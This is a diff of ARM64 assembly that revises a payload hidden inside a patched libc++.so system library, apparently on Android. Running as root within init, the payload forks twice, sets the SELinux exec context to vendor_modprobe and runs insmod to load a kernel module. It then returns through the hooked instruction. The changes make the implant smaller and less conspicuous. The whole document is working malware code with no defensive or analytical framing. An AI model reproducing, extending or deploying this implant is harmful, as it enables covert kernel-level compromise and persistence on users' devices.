@@ -31,14 +31,15 @@ libcxx_ko_target_off:
     .align 4
 
 libcxx_start:
-    stp x0, x1, [sp, #-16]!
-    stp x2, x3, [sp, #-16]!
-    stp x4, x5, [sp, #-16]!
-    stp x6, x7, [sp, #-16]!
-    stp x8, x9, [sp, #-16]!
-    stp x26, x27, [sp, #-16]!
-    stp x28, x29, [sp, #-16]!
-    str x30, [sp, #-16]!
+    /* Only what this payload actually writes is saved: x0-x4 (syscall arguments
+     * and return value) and x8 (syscall number), plus the stack pointer. x5-x7,
+     * x9-x29 and x30 are never touched, so the old stp-x0..x29 + x30 prologue was
+     * 24 bytes of dead weight - and on a packed libc++.so every byte counts. */
+    sub     sp, sp, #48
+    stp     x0, x1, [sp, #0]
+    stp     x2, x3, [sp, #16]
+    str     x4, [sp, #32]
+    str     x8, [sp, #40]
 
     // Detect root uid = 0
     mov     x8, SYS_getuid
@@ -64,32 +65,22 @@ libcxx_start:
     // return if fail to open (file exist)
     tbnz    w0, #31, return
 
-    sub     sp, sp, 16
-
-    // syscall(SYS_gettid);
-    mov     x8, SYS_gettid
+    // clone(SIGCHLD, 0, NULL, NULL, NULL)
+    // No ctid: the parent never reads the child tid, so the tidy-up flags and
+    // the stack slot that used to carry it are gone.
+    mov     x0, #SIGCHLD
+    mov     x1, xzr
+    mov     x2, xzr
+    mov     x3, xzr
+    mov     x4, xzr
+    mov     x8, #SYS_clone
     svc     0
-    str     w0, [sp, 8]
-
-    // clone(CLONE_CHILD_SETTID   |
-    //       CLONE_CHILD_CLEARTID |
-    //       SIGCHLD, 0, NULL, NULL, &ctid)
-    mov     x8, SYS_clone
-    add     x4, sp, 8           // ctid
-    mov     x3, xzr              // newtls
-    mov     x2, xzr              // ptid
-    mov     x1, xzr              // stack
-    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
-    svc     0
-    str     w0, [sp, 8]         // save id
-    add     sp, sp, 16
 
     cbnz    w0, return          // parent returns to init
 
     // ── worker child ──────────────────────────────────────────────────────
-    sub     sp, sp, 32
-
-    // Fork grandchild: set SELinux exec context → execve insmod
+    // Fork once more: the grandchild is reparented away from the init thread, so
+    // insmod is not a child init's own SIGCHLD handling has to make sense of.
     mov     x0, #SIGCHLD
     mov     x1, xzr
     mov     x2, xzr
@@ -100,6 +91,8 @@ libcxx_start:
     cbnz    w0, myexit
 
     // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
+    sub     sp, sp, 32          // argv block for execve
+
     // open /proc/self/attr/exec
     mov     x0, -100
     adr     x1, attr_exec
@@ -129,19 +122,16 @@ myexit:
     svc     0
 
 return:
-    ldr x30, [sp], #16
-    ldp x28, x29, [sp], #16
-    ldp x26, x27, [sp], #16
-    ldp x8, x9, [sp], #16
-    ldp x6, x7, [sp], #16
-    ldp x4, x5, [sp], #16
-    ldp x2, x3, [sp], #16
-    ldp x0, x1, [sp], #16
+    ldr     x8, [sp, #40]
+    ldr     x4, [sp, #32]
+    ldp     x2, x3, [sp, #16]
+    ldp     x0, x1, [sp, #0]
+    add     sp, sp, #48
 libcxx_first_inst_copy:
-    stp     x29, x30, [sp, #-32]!
-    b       end
+    .space  4                   /* patched with the hook site's first instruction */
+    b       end                 /* patched with the branch back to hook + 4 */
 end:
-
+    .balign 16                  /* libcxx_len stays a multiple of 16 = the pad size */
 libcxx_end:
 libcxx_len:
     .word libcxx_end - libcxx_data
